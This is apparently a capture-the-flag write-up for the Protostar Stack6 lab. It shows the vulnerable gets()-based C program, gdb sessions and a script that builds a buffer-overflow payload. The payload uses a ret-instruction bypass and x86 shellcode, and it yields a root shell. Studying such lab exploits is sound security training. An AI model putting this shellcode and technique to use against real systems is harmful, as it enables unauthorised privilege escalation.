#### Protostar Stack6

##### About
Stack6 looks at what happens when you have restrictions on the return address.  
  
This level can be done in a couple of ways, such as finding the duplicate of the payload ((objdump -s) will help with this), or ret2libc, or even return orientated programming.  
  
It is strongly suggested you experiment with multiple ways of getting your code to execute here.  
This level is at /opt/protostar/bin/stack6

##### Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

In fact, we can try to make EIP point to a ret command, then a value(our shellcode address) on the stack will be pop to EIP again, so that the ret check can be bypassed.  
  
Other ways to solve this challenge can be found in references.

##### Solution
```
$ gdb stack6
......
(gdb) disas getpath
Dump of assembler code for function getpath:
0x08048484 <+0>:    push   %ebp
0x08048485 <+1>:    mov    %esp,%ebp
0x08048487 <+3>:    sub    $0x68,%esp
0x0804848a <+6>:    mov    $0x80485d0,%eax
0x0804848f <+11>:   mov    %eax,(%esp)
0x08048492 <+14>:   call   0x80483c0 <printf@plt>
0x08048497 <+19>:   mov    0x8049720,%eax
0x0804849c <+24>:   mov    %eax,(%esp)
0x0804849f <+27>:   call   0x80483b0 <fflush@plt>
0x080484a4 <+32>:   lea    -0x4c(%ebp),%eax
0x080484a7 <+35>:   mov    %eax,(%esp)
0x080484aa <+38>:   call   0x8048380 <gets@plt>
......
0x080484f9 <+117>:  ret ; <-- try to return to this command and then jump to the shellcode
End of assembler dump.
......
(gdb) quit

$ python -c "print 'A'*80+'B'*4+'C'*80" | ./stack6
......
Segmentation fault (core dumped)

root@protostar:/tmp# gdb -q -c core.11.stack6.1637
Core was generated by './stack6'.
Program terminated with signal 11, Segmentation fault.
#0  0x42424242 in ?? ()
(gdb) x/40x $esp-100
0xbffffcec:     0x00000001      0x00000000      0x00000001      0xb7fff8f8
0xbffffcfc:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffd0c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffd1c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffd2c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffd3c:     0x42424242      0x41414141      0x41414141      0x41414141
0xbffffd4c:     0x42424242      0x43434343      0x43434343      0x43434343
0xbffffd5c:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffd6c:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffd7c:     0x43434343      0x43434343      0x43434343      0x43434343
(gdb) quit

$ cat script.sh
#!/bin/sh
python -c "print 'A'*80+'\xf9\x84\x04\x08'+'\x54\xfd\xff\xbf'+'\x90'*20+'\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'" > /tmp/payload

$ ./script.sh
......
$ ./stack6 < /tmp/payload
......
# whoami
root
```

#### Reference
<https://github.com/Wins0n/Exploit-Exercises_ProtoStar/blob/master/protostar_part1.md>  
<https://thesprawl.org/research/exploit-exercises-protostar-stack/#stack-6>  
<https://www.mattandreko.com/2011/12/22/exploit-exercises-protostar-stack-6/>  
